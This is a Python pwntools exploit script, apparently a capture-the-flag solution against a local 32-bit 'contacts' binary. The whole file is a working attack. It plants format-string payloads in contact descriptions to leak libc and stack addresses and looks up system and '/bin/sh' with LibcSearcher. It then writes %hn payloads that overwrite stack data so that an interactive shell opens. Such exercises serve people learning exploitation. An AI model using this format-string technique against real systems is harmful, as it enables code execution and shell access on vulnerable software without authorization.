from pwn import*
from LibcSearcher import*
p = process('./contacts')
elf = ELF('./contacts')
#context.log_level = 'debug'

def CreateContact(name, phone, descrip_len, description):
	p.recvuntil('>>> ')
	p.sendline('1')
	p.recvuntil('Contact info: \n')
	p.recvuntil('Name: ')
	p.sendline(name)
	p.recvuntil('You have 10 numbers\n')
	p.sendline(phone)
	p.recvuntil('Length of description: ')
	p.sendline(descrip_len)
	p.recvuntil('description:\n\t\t')
	p.sendline(description)

def PrintContact():
	p.recvuntil('>>> ')
	p.sendline('4')
	p.recvuntil('Contacts:')
	p.recvuntil('Description: ')

def NewAddr(address,modifiedAddress):
	modified_high = (modifiedAddress &0xffff0000) >> 16
	modified_low  = modifiedAddress &0xffff
	#
	temp_low = (address + 2) &0xffff
	payload1 = '%' + str(temp_low) + 'c' + '%33$hn'
	temp_high = (address) & 0xffff
	payload2 = '%' + str(temp_high) + 'c' + '%34$hn'
	#
	payload3 = '%' + str(modified_high) + 'c' + '%69$hn'
	payload4 = '%' + str(modified_low) +  'c' + '%71$hn'
	payload = payload1+payload2+payload3+payload4
	return payload

#Get the libc version
payload = '%31$pEND'
CreateContact('First','12345','20',payload)
PrintContact()
libc_start_main_ret = int(p.recvuntil('END',drop = True),16)
log.success('Libc_start_main_ret Addr:'+hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret',libc_start_main_ret)
libcbase = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('System_Addr:'+hex(system_addr))
log.success('Binsh_Addr:'+hex(binsh_addr))
payload = 'START%6$p'
CreateContact('Second','12345','20',payload)
PrintContact()
p.recvuntil('Description: ')
ebp_addr = int(p.recvuntil('START',drop = True),16)-0x30
P1 = NewAddr(ebp_addr+0xC,binsh_addr)
P2 = NewAddr(ebp_addr+4,system_addr)
payload = P1+P2
CreateContact('Modify','12345','200',payload)
PrintContact()
p.interactive()


